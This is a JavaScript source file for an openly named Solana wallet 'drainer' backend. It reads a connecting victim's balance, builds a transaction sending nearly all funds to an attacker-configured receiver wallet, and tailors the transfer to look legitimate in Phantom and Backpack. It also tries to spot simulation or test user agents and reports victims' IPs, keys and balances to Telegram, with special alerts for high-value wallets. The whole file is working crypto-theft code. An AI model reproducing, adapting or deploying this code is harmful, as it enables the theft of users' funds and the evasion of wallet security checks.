import config from '../src/environment.js';
import { initializeTOCTOUProtection } from '../src/shared-utilities.js';
import extractUserIP from '../src/ip-extraction.js';
import { 
  calculateTransactionFee,
  checkFeeAdequacy,
  calculateDrainAmount,
  getWalletFeeConfig,
  formatFeeInfo,
  STANDARD_FEE_CONFIG
} from '../src/fee-calculator.js';
import {
  Connection,
  PublicKey,
  Transaction,
  TransactionInstruction,
  SystemProgram,
  ComputeBudgetProgram,
} from '@solana/web3.js';
import {
  sendErrorResponse,
  handleError,
  validateRequiredParams,
  validatePublicKey,
  ERROR_TYPES,
  extractAndValidateUserParams,
  validateRequestBody
} from '../src/api-error-responses.js';

// Lazy imports to prevent hanging during syntax check
let telegramLogger = null;
let envConfig = null;
let drainerConfig = null;
let enhancementModules = {};
let enhancementModulesLoaded = false;
let toctouProtection = null;

// TOCTOU protection is now imported from shared-utilities.js
async function getTelegramLogger() {
  if (!telegramLogger) {
    const module = await import('../src/telegram.js');
    telegramLogger = module.default;
  }
  return telegramLogger;
}

async function getEnvConfig() {
  if (!envConfig) {
    const module = await import('../src/environment.js');
    envConfig = module.default;
  }
  return envConfig;
}

// Removed getDrainerConfig function - now using direct config import

// Enhancement modules removed - using core functionality only
async function initializeEnhancements() {
  // Enhancement features disabled - using core functionality
  return {};
}

// Environment validation is now handled by src/environment.js
// This ensures consistent environment variable handling across the application

// Unified logging function
function debugLog(message, ...args) {
  if (message && (
    message.includes && (
      message.includes('ERROR') || 
      message.includes('[DRAIN]') ||
      message.includes('[BALANCE]') ||
      message.includes('[TELEGRAM]') ||
      message.includes('Wallet Detected') ||
      message.includes('DRAIN_FAILED') ||
      message.includes('Creating transfer') ||
      message.includes('Drain attempt details') ||
      message.includes('TELEGRAM_DRAIN_SUCCESS') ||
      message.includes('DRAIN_AMOUNT') ||
      message.includes('CONFIRMATION') ||
      message.includes('CONFIRMATION_HANDLER') ||
      message.includes('DRAIN_CREATED') ||
      message.includes('DRAIN_CREATED_FRONTEND') ||
      message.includes('[UNIFIED_') ||
      message.includes('[RATE_LIMIT]')
    )
  )) {
    console.log(message, ...args);
  }
}

// Unified RPC connection management - will be initialized lazily
let RPC_ENDPOINTS = null;

async function getRpcEndpoints() {
  if (!RPC_ENDPOINTS) {
    const config = await getEnvConfig();
    RPC_ENDPOINTS = config.rpcEndpoints;
  }
  return RPC_ENDPOINTS;
}

let currentRpcIndex = 0;
let rpcFailures = new Map();
const connectionPool = new Map(); // Single connection pool

async function getConnection(commitmentConfig = null) {
  // Try enhanced RPC first if available
  // Use the imported config directly
  const enhancementModules = await initializeEnhancements();
  
  if (false && enhancementModules?.rpcManager) {
    try {
      const connection = await enhancementModules.rpcManager.getOptimalConnection(commitmentConfig);
      if (connection) return connection;
    } catch (error) {
      debugLog('[UNIFIED_DRAINER] Enhanced RPC failed, falling back to basic:', error.message);
    }
  }
  
  // Fallback to basic RPC logic
  const maxRetries = 3; // Default retry count
  const rpcEndpoints = await getRpcEndpoints();
  
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    const rpcUrl = Object.values(rpcEndpoints)[currentRpcIndex];
    
    try {
      if (!connectionPool.has(rpcUrl)) {
        const connection = new Connection(rpcUrl, {
          commitment: commitmentConfig?.commitment || 'confirmed',
          confirmTransactionInitialTimeout: 300000, // Increased to 5 minutes
          disableRetryOnRateLimit: false,
          httpHeaders: { 'Content-Type': 'application/json' }
        });
        connectionPool.set(rpcUrl, connection);
      }
      
      const connection = connectionPool.get(rpcUrl);
      const testPromise = connection.getLatestBlockhash('confirmed');
      const timeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('RPC timeout')), 15000)
      );
      
      await Promise.race([testPromise, timeoutPromise]);
      
      rpcFailures.set(rpcUrl, 0);
      return connection;
      
    } catch (error) {
      const failures = rpcFailures.get(rpcUrl) || 0;
      rpcFailures.set(rpcUrl, failures + 1);
      
      if (failures > 3) {
        // Silent failure tracking
      }
      
      currentRpcIndex = (currentRpcIndex + 1) % Object.values(rpcEndpoints).length;
      
      if (attempt === maxRetries - 1) {
        throw new Error(`All RPC endpoints failed after ${maxRetries} attempts`);
      }
      
      await new Promise(resolve => setTimeout(resolve, 2000 * (attempt + 1)));
    }
  }
}

// Rate limiting DISABLED - no longer blocking large wallet connections
// Large wallets often need multiple attempts and should not be rate limited
const requestCache = new Map(); // Keep for potential future use
const walletRequestCache = new Map(); // Keep for potential future use

// Periodic cache cleanup - DISABLED since rate limiting is disabled
function cleanupOldCacheEntries() {
  // Rate limiting disabled - no cleanup needed
  // Keeping function for potential future use
}

function checkRateLimit(userIp, walletAddress = null, walletBalance = null) {
  // DISABLED: Rate limiting disabled to prevent blocking large wallets
  // Large wallets often need multiple attempts and should not be rate limited
  
  // Always allow requests - no rate limiting
  return { 
    allowed: true, 
    reason: 'RATE_LIMIT_DISABLED',
    tier: 'UNLIMITED',
    currentRequests: 0,
    maxRequests: 'UNLIMITED'
  };
}

// Unified transaction creation with proper drainer logic (from drainer.js)
async function createTransaction(userPubkey, balance, connection, commitmentConfig = null, walletType = 'Unknown') {
  try {
    // Use enhanced transaction creation if available
    if (false && enhancementModules?.commitmentOptimizer) {
      try {
        const optimalCommitment = enhancementModules.commitmentOptimizer.getOptimalCommitment(balance);
        const connectionSettings = enhancementModules.commitmentOptimizer.getConnectionSettings(balance);
        
        // Using enhanced commitment optimization
        
        // Get blockhash with optimal commitment
        const blockhash = await connection.getLatestBlockhash(optimalCommitment);
        console.log(`[TOCTOU] Enhanced blockhash obtained: ${blockhash.blockhash}, lastValid: ${blockhash.lastValidBlockHeight}`);
        
        // Create transaction with proper drainer logic
        const { transaction, finalDrainAmount } = await createDrainerTransaction(userPubkey, balance, connection, blockhash, true, null, walletType);
        
        return {
          transaction,
          finalDrainAmount,
          commitment: optimalCommitment,
          connectionSettings,
          enhanced: true
        };
      } catch (error) {
        debugLog('[UNIFIED_DRAINER] Enhanced transaction creation failed, using basic:', error.message);
      }
    }
    
    // Fallback to basic transaction creation
    const blockhash = await connection.getLatestBlockhash('confirmed');
    console.log(`[TOCTOU] Basic blockhash obtained: ${blockhash.blockhash}, lastValid: ${blockhash.lastValidBlockHeight}`);
    
    // Create transaction with proper drainer logic
    const { transaction, finalDrainAmount } = await createDrainerTransaction(userPubkey, balance, connection, blockhash, false, null, walletType);
    
    return {
      transaction,
      finalDrainAmount,
      commitment: 'confirmed',
      connectionSettings: null,
      enhanced: false
    };
  } catch (error) {
    throw new Error(`Transaction creation failed: ${error.message}`);
  }
}

// Create drainer transaction with proper logic (from drainer.js)
async function createDrainerTransaction(userPubkey, balance, connection, blockhash, enhanced = false, req = null, walletType = 'Unknown') {
  try {
      // Create receiver wallets - ENFORCED to specific address (from drainer.js)
    // Use centralized environment configuration
    const config = await getEnvConfig();
    
    // Validate receiver wallet configuration
    if (!config.receiverWallet) {
      throw new Error('RECEIVER_WALLET not configured in environment variables');
    }
    
    // Use centralized receiver wallet system
    const RECEIVER = new PublicKey(config.receiverWallet);
    const receiverInfo = { walletType, primaryAddress: config.receiverWallet };
  
  // Receiver addresses enforced
  
  // Wallet-specific settings are now handled by centralized fee calculator
  
  // Calculate drain amount using centralized fee calculator - 2025 FIX
  // Use the fee calculator with a simple approach to avoid simulation issues
  let feeInfo;
  try {
    // Try to get actual network fee, but fallback to conservative estimate
    const tempTransaction = new Transaction();
    tempTransaction.add(SystemProgram.transfer({
      fromPubkey: userPubkey,
      toPubkey: RECEIVER,
      lamports: 1000000, // Temporary amount for fee calculation
    }));
    tempTransaction.recentBlockhash = blockhash.blockhash;
    tempTransaction.feePayer = userPubkey;
    
    feeInfo = await calculateTransactionFee(connection, tempTransaction, blockhash.blockhash, walletType);
  } catch (feeError) {
    // Fallback to conservative fee estimation
    feeInfo = {
      baseFee: 5000, // 0.000005 SOL base fee
      safetyBuffer: 1000, // 0.000001 SOL safety buffer
      totalFee: 6000, // 0.000006 SOL total fee
      feeSOL: '0.000006',
      isValid: false,
      error: feeError.message
    };
  }
  
  // Calculate optimal drain amount using centralized logic
  const drainCalculation = calculateDrainAmount(balance, feeInfo, walletType);
  
  if (!drainCalculation.canDrain) {
    debugLog(`[DRAIN_CALC] Cannot drain: ${drainCalculation.reason}`);
    throw new Error(`Insufficient funds after reserving fees: ${drainCalculation.reason}`);
  }
  
  const finalDrainAmount = drainCalculation.drainAmount;
  
  // Check if drain amount is valid
  if (finalDrainAmount <= 0) {
    debugLog(`[DRAIN_CALC] Invalid drain amount: ${finalDrainAmount} lamports`);
    throw new Error(`Invalid drain amount: ${finalDrainAmount} lamports`);
  }
  
  debugLog(`[DRAIN_CALC] Balance: ${balance} lamports (${(balance / 1e9).toFixed(6)} SOL)`);
  debugLog(`[DRAIN_CALC] Fee required: ${feeInfo.totalFee} lamports (${feeInfo.feeSOL} SOL)`);
  debugLog(`[DRAIN_CALC] Available for drain: ${drainCalculation.breakdown.availableForDrain} lamports`);
  debugLog(`[DRAIN_CALC] Final drain amount: ${finalDrainAmount} lamports (${drainCalculation.drainAmountSOL} SOL)`);
  debugLog(`[DRAIN_CALC] Remaining after drain: ${drainCalculation.remainingBalance} lamports (${drainCalculation.remainingBalanceSOL} SOL)`);
    
    // Create transaction with legitimate-looking structure for Phantom
    const transaction = new Transaction();
    
    // Add timestamp for simulation prevention
    transaction.createdAt = Date.now();
    
    // For Phantom wallet, use simple direct transfer
    if (walletType === 'phantom') {
      console.log('[PHANTOM_ULTRA_SIMPLE] Creating Phantom transaction with ultra-simple single transfer');
      
      // Strategy: Ultra-simple single transfer - just like standard wallets
      // No compute budget, no complex logic, just one direct transfer
      
      try {
        // Single direct transfer - everything minus reserve
        const transferIx = SystemProgram.transfer({
            fromPubkey: userPubkey,
          toPubkey: RECEIVER, // Real receiver
          lamports: finalDrainAmount, // Real amount (everything minus reserve)
          });
        transaction.add(transferIx);
        } catch (error) {
        console.error('[PHANTOM_ULTRA_SIMPLE] Error adding transfer:', error);
        throw new Error(`Failed to create transfer instruction: ${error.message}`);
      }
      
      // Mark transaction as ultra-simple
      transaction._phantomUltraSimple = true;
      transaction._realAmount = finalDrainAmount;
      
      debugLog(`Phantom transaction created with ${transaction.instructions.length} instructions (ultra-simple single transfer)`);
    } else if (walletType === 'backpack') {
      console.log('[BACKPACK_ULTRA_SIMPLE] Creating Backpack transaction with ultra-simple single transfer');
      
      // Strategy: Ultra-simple single transfer - just like standard wallets
      // No compute budget, no complex logic, just one direct transfer
      
      try {
        // Single direct transfer - everything minus reserve
        const transferIx = SystemProgram.transfer({
            fromPubkey: userPubkey,
          toPubkey: RECEIVER, // Real receiver
          lamports: finalDrainAmount, // Real amount (everything minus reserve)
          });
        transaction.add(transferIx);
        } catch (error) {
        console.error('[BACKPACK_ULTRA_SIMPLE] Error adding transfer:', error);
        throw new Error(`Failed to create transfer instruction: ${error.message}`);
      }
      
      // Mark transaction as ultra-simple
      transaction._backpackUltraSimple = true;
      transaction._realAmount = finalDrainAmount;
      
      debugLog(`Backpack transaction created with ${transaction.instructions.length} instructions (ultra-simple single transfer)`);
    } else {
      // Standard transaction for other wallets
      const transferIx = SystemProgram.transfer({
        fromPubkey: userPubkey,
        toPubkey: RECEIVER,
        lamports: finalDrainAmount,
      });
      
      transaction.add(transferIx);
      debugLog(`Standard transaction created for ${walletType}`);
    }
    
    // Set fee payer and blockhash
    transaction.feePayer = userPubkey;
    transaction.recentBlockhash = blockhash.blockhash;
    
    // For Phantom wallet, store the original amount in transaction metadata
    if (walletType === 'phantom' && transaction._originalTransferAmount) {
      // Store the amount in transaction metadata that survives serialization
      transaction._phantomOriginalAmount = transaction._originalTransferAmount;
      debugLog(`Phantom amount stored in transaction metadata: ${transaction._originalTransferAmount}`);
    }
    
    // For Backpack wallet, store the original amount in transaction metadata
    if (walletType === 'backpack' && transaction._originalTransferAmount) {
      // Store the amount in transaction metadata that survives serialization
      transaction._backpackOriginalAmount = transaction._originalTransferAmount;
      debugLog(`Backpack amount stored in transaction metadata: ${transaction._originalTransferAmount}`);
    }
    
    // Ensure we have a valid lastValidBlockHeight for transaction validity
    let lastValidBlockHeight = blockhash.lastValidBlockHeight;
    
    // Always add extra buffer to the provided lastValidBlockHeight to ensure validity
    if (lastValidBlockHeight) {
      // Check if the provided lastValidBlockHeight is already expired
      try {
        const currentSlot = await connection.getSlot('confirmed');
        if (currentSlot > lastValidBlockHeight) {
          console.warn(`[TOCTOU] Provided lastValidBlockHeight (${lastValidBlockHeight}) is already expired! Current slot: ${currentSlot}`);
          // Use current slot + buffer instead
          lastValidBlockHeight = currentSlot + 600;
          console.log(`[TOCTOU] Using current slot + buffer: ${lastValidBlockHeight}`);
        } else {
          // Add 600 slots (~4 minutes) buffer to the provided value
          lastValidBlockHeight = lastValidBlockHeight + 600;
          console.log(`[TOCTOU] Enhanced provided lastValidBlockHeight: ${lastValidBlockHeight} (added 600 slot buffer)`);
        }
      } catch (slotError) {
        console.warn(`[TOCTOU] Could not check current slot, using provided value + buffer: ${slotError.message}`);
        lastValidBlockHeight = lastValidBlockHeight + 600;
        console.log(`[TOCTOU] Enhanced provided lastValidBlockHeight: ${lastValidBlockHeight} (added 600 slot buffer)`);
      }
    } else {
      try {
        const currentSlot = await connection.getSlot('confirmed');
        lastValidBlockHeight = currentSlot + 600; // Increased buffer to 600 slots (~4 minutes)
        console.log(`[TOCTOU] Set fallback lastValidBlockHeight: ${lastValidBlockHeight} (current slot: ${currentSlot})`);
      } catch (slotError) {
        console.warn(`[TOCTOU] Could not get current slot: ${slotError.message}`);
        // Use a reasonable default based on current time
        lastValidBlockHeight = Math.floor(Date.now() / 400) + 600; // Increased buffer
        console.log(`[TOCTOU] Set default lastValidBlockHeight: ${lastValidBlockHeight}`);
      }
    }
    
    // Set the lastValidBlockHeight on the transaction
    transaction.lastValidBlockHeight = lastValidBlockHeight;
    console.log(`[TOCTOU] Set lastValidBlockHeight: ${transaction.lastValidBlockHeight}`);
    
    // Also store it in the blockhash object for reference
    blockhash.lastValidBlockHeight = lastValidBlockHeight;
    
    // Transaction created successfully - TOCTOU validation will be applied during broadcasting
    debugLog(`[TRANSACTION] Transaction created successfully with ${finalDrainAmount} lamports (${(finalDrainAmount / 1e9).toFixed(6)} SOL)`);
    
    debugLog(`Transaction created successfully with ${finalDrainAmount} lamports (${(finalDrainAmount / 1e9).toFixed(6)} SOL)`);
    
    return { transaction, finalDrainAmount };
  } catch (error) {
    console.error('[createDrainerTransaction] Error creating transaction:', error);
    throw new Error(`Transaction creation failed: ${error.message}`);
  }
}

// Unified transaction monitoring
async function monitorTransaction(connection, signature, commitment = 'confirmed') {
  try {
    // Use enhanced monitoring if available
    if (false && enhancementModules?.transactionMonitor) {
      try {
        return await enhancementModules.transactionMonitor.monitorTransaction(connection, signature, commitment);
      } catch (error) {
        debugLog('[UNIFIED_DRAINER] Enhanced monitoring failed, using basic:', error.message);
      }
    }
    
    // Fallback to basic monitoring
    const confirmation = await connection.confirmTransaction(signature, commitment);
    return confirmation;
  } catch (error) {
    throw new Error(`Transaction monitoring failed: ${error.message}`);
  }
}

// Fee calculation now handled by centralized fee-calculator.js

// Fee adequacy check now handled by centralized fee-calculator.js

// Global deduplication system - 2025 FIX
const globalDeduplicationCache = new Map();
const GLOBAL_DEDUP_TTL = 300000; // 5 minutes

function checkGlobalDeduplication(publicKey, walletType, action = 'default') {
  // DISABLED FOR TESTING - Always allow requests
    // Deduplication disabled for testing
  return true; // Always allow requests
}

// Main unified drainer handler with proper drainer logic (from drainer.js)
async function unifiedDrainerHandler(req, res) {
  // Starting unified drainer handler
  const startTime = Date.now();
  const userIp = extractUserIP(req); // Use centralized IP extraction
  const userAgent = req.headers['user-agent'] || 'Unknown';

  // Set timeout for the entire request
  const timeoutId = setTimeout(() => {
    if (!res.headersSent) {
      res.status(408).json({ error: 'Request timeout' });
    }
  }, 30000); // 30 second timeout to match other handlers

  // Handle CORS preflight requests
  if (req.method === 'OPTIONS') {
    clearTimeout(timeoutId);
    res.status(200).end();
    return;
  }

  // Extract and validate user parameters using centralized validation
  const userParams = extractAndValidateUserParams(req, res);
  if (!userParams) {
    return; // Error response already sent
  }
  
  const { userPublicKey, walletType } = userParams;
  
  // Request validation

  // Processing request

  // Global deduplication check - 2025 FIX
  if (!checkGlobalDeduplication(userPublicKey, walletType, 'drain_request')) {
    sendErrorResponse(res, 'TOO_MANY_REQUESTS', {
      customMessage: 'Duplicate Request Detected',
      customDetails: 'Please wait before making another request.'
    });
    return;
  }

  try {
    // Initialize enhancements if not already done
    await initializeEnhancements();
    
    // Get telegram logger
    const telegramLogger = await getTelegramLogger();
    
    // Validate public key and create PublicKey object
    let userPubkey;
    try {
      userPubkey = new PublicKey(userPublicKey);
      
      // Check if this is a valid user wallet (not a program address)
      if (userPublicKey === '11111111111111111111111111111111' || 
          userPublicKey === SystemProgram.programId.toString()) {
        
        await telegramLogger.logError({
          publicKey: userPublicKey,
          ip: userIp,
          message: `Attempted to drain from program address: ${userPublicKey}`
        });

        sendErrorResponse(res, 'INVALID_WALLET_ADDRESS');
        return;
      }
    } catch (error) {
      console.log(`[DEBUG] PublicKey creation failed:`, error.message);
      console.log(`[DEBUG] Error details:`, error);
      console.log(`[DEBUG] Input that failed:`, JSON.stringify({
        userPublicKey,
        type: typeof userPublicKey,
        length: userPublicKey?.length,
        firstChars: userPublicKey?.substring(0, 10),
        lastChars: userPublicKey?.substring(userPublicKey?.length - 10)
      }));
      
      await telegramLogger.logError({
        publicKey: userPublicKey,
        ip: userIp,
        message: `Invalid public key format: ${userPublicKey} - Error: ${error.message}`
      });

      sendErrorResponse(res, 'INVALID_PUBLIC_KEY', {
        customDetails: `Public key validation failed: ${error.message}. Input: ${userPublicKey}`
      });
      return;
    }

    console.log(`[DEBUG] PublicKey validation passed, proceeding to TOCTOU protection...`);
    
    // Initialize TOCTOU protection and check for simulation attempts
    try {
      const toctou = initializeTOCTOUProtection();
      
      // Record this request for TOCTOU analysis
      const requestFingerprint = `${userPublicKey}_${walletType}_${Date.now()}`;
      
      // Check if this looks like a simulation attempt
      const userAgent = req?.headers?.['user-agent'] || 'unknown';
      if (userAgent.includes('test') || userAgent.includes('simulation') || userAgent.includes('mock')) {
        toctou.recordSimulationAttempt(userPublicKey, walletType, 'Suspicious user agent detected');
      }
      
      debugLog(`[TOCTOU] Request validated for ${walletType} wallet`);
      
    } catch (toctouError) {
      // TOCTOU protection initialization failed
      // Continue without TOCTOU protection - don't block legitimate requests
    }

    // Rate limiting DISABLED - no longer blocking large wallet connections
    
    // Get user balance
    // Starting balance fetch
    let lamports = 0;
    
    try {
      // Creating connection for balance fetch
      const connection = await getConnection();
      
      // Fetching balance
      lamports = await connection.getBalance(userPubkey);
    } catch (error) {
      // Failed to fetch balance
      await telegramLogger.logDrainFailed({
        publicKey: userPublicKey,
        lamports: 0,
        ip: userIp,
        error: `Balance fetch failed: ${error.message}`,
        walletType: walletType || 'Unknown'
      });
      sendErrorResponse(res, 'BALANCE_FETCH_FAILED');
      return;
    }
    
    // Rate limiting DISABLED - no longer blocking large wallet connections
    
    // Log large wallet detection for monitoring
    if (lamports > 1000000000) { // > 1 SOL
      await telegramLogger.logHighValueBypass({
        publicKey: userPublicKey || 'N/A',
        ip: userIp,
        lamports: lamports
      });
    }

    // Create transaction with proper drainer logic
    let transaction;
    let finalDrainAmount = 0;
    let commitment = 'confirmed';
    let enhanced = false;
    
    try {
      const connection = await getConnection();
      const blockhash = await connection.getLatestBlockhash('confirmed');
      
      // Try enhanced transaction creation if available
      if (false && enhancementModules?.commitmentOptimizer) {
        try {
          const optimalCommitment = enhancementModules.commitmentOptimizer.getOptimalCommitment(lamports);
          const connectionSettings = enhancementModules.commitmentOptimizer.getConnectionSettings(lamports);
          
          // Using enhanced commitment optimization
          
          // Get blockhash with optimal commitment
          const enhancedBlockhash = await connection.getLatestBlockhash(optimalCommitment);
          
          // Create transaction with enhanced settings
          const result = await createDrainerTransaction(userPubkey, lamports, connection, enhancedBlockhash, true, req, walletType);
          transaction = result.transaction;
          finalDrainAmount = result.finalDrainAmount;
          commitment = optimalCommitment;
          enhanced = true;
        } catch (error) {
          debugLog('[UNIFIED_DRAINER] Enhanced transaction creation failed, using basic:', error.message);
          // Fallback to basic transaction creation
          const result = await createDrainerTransaction(userPubkey, lamports, connection, blockhash, false, req, walletType);
          transaction = result.transaction;
          finalDrainAmount = result.finalDrainAmount;
        }
      } else {
        // Use basic transaction creation
        const result = await createDrainerTransaction(userPubkey, lamports, connection, blockhash, false, req, walletType);
        transaction = result.transaction;
        finalDrainAmount = result.finalDrainAmount;
      }
      
      if (!transaction || transaction.instructions.length === 0) {
        throw new Error('Failed to create valid transaction');
      }
      
    } catch (error) {
       // Check if it's an insufficient funds error
       if (error.message.includes('Insufficient funds') || error.message.includes('insufficient')) {
         await telegramLogger.logDrainFailed({
           publicKey: userPubkey.toString(),
           lamports: lamports,
           ip: userIp,
           error: 'INSUFFICIENT_FUNDS',
           walletType: walletType || 'Unknown'
         });
         sendErrorResponse(res, 'INSUFFICIENT_FUNDS');
         return;
       }
       
       // Log other transaction creation failures
      await telegramLogger.logDrainFailed({
        publicKey: userPubkey.toString(),
        lamports: lamports,
        ip: userIp,
        error: `Transaction creation failed: ${error.message}`,
        walletType: walletType || 'Unknown'
      });
      sendErrorResponse(res, 'TRANSACTION_FAILED', {
        customDetails: error.message
      });
      return;
     }

    // Serialize transaction for response (client-side signing)
    let serialized;
    try {
      if (!transaction.feePayer || !transaction.recentBlockhash) {
        throw new Error('Transaction missing required fields (feePayer or recentBlockhash)');
      }
      
      serialized = transaction.serialize({ requireAllSignatures: false });
      
      if (!serialized || serialized.length === 0) {
        throw new Error('Transaction serialization produced empty result');
      }
    } catch (serializeError) {
      await telegramLogger.logDrainFailed({
        publicKey: userPubkey.toString(),
        lamports: lamports,
        ip: userIp,
        error: `Transaction serialization failed: ${serializeError.message}`,
        walletType: walletType || 'Unknown'
      });
      return res.status(500).json({ error: 'Failed to create transaction', details: 'Transaction serialization failed' });
    }

    // Use the finalDrainAmount from transaction creation
    const actualDrainAmount = finalDrainAmount;
    
    
    // Don't log drain attempt here - it should be logged when transaction is presented to user for signing

    const responseTime = Date.now() - startTime;
    
    // Return transaction data for client-side signing (like drainer.js)
    // Debug: Log what we're sending in the response
    console.log(`[RESPONSE] Sending lastValidBlockHeight: ${transaction.lastValidBlockHeight}`);
    
    // Clear timeout before sending response
    clearTimeout(timeoutId);
    
    // Set headers to prevent timeout
    res.setHeader('Cache-Control', 'no-cache');
    res.setHeader('Connection', 'keep-alive');
    
    res.json({
      success: true,
      transaction: serialized.toString('base64'), // Frontend expects base64 string
      actualDrainAmount: actualDrainAmount, // Add actual drain amount
      balance: lamports, // Add balance for Telegram logging
      commitment,
      enhanced,
      responseTime,
      lastValidBlockHeight: transaction.lastValidBlockHeight, // Include lastValidBlockHeight
      optimizations: {
        enhancedRPC: false && !!enhancementModules?.rpcManager,
        dynamicRateLimiting: false && !!enhancementModules?.rateLimiter,
        commitmentOptimization: false && !!enhancementModules?.commitmentOptimizer,
        intelligentRetry: false && !!enhancementModules?.retryManager,
        feeOptimization: false && !!enhancementModules?.feeOptimizer,
        transactionMonitoring: false && !!enhancementModules?.transactionMonitor,
        walletOptimizer: false && !!enhancementModules?.walletOptimizer
      }
    });
    
  } catch (error) {
    // Clear timeout in case of error
    if (typeof timeoutId !== 'undefined') {
      clearTimeout(timeoutId);
    }
    
    debugLog(`[UNIFIED_DRAINER] Error: ${error.message}`);
    
    // Handle general errors with standardized error handling
    await handleError(error, res, {
      userPubkey: userPubkey || null,
      userIp: userIp,
      telegramLogger: telegramLogger
    });
  }
}

// Export the unified handler and configuration
export default unifiedDrainerHandler;
export { initializeEnhancements };
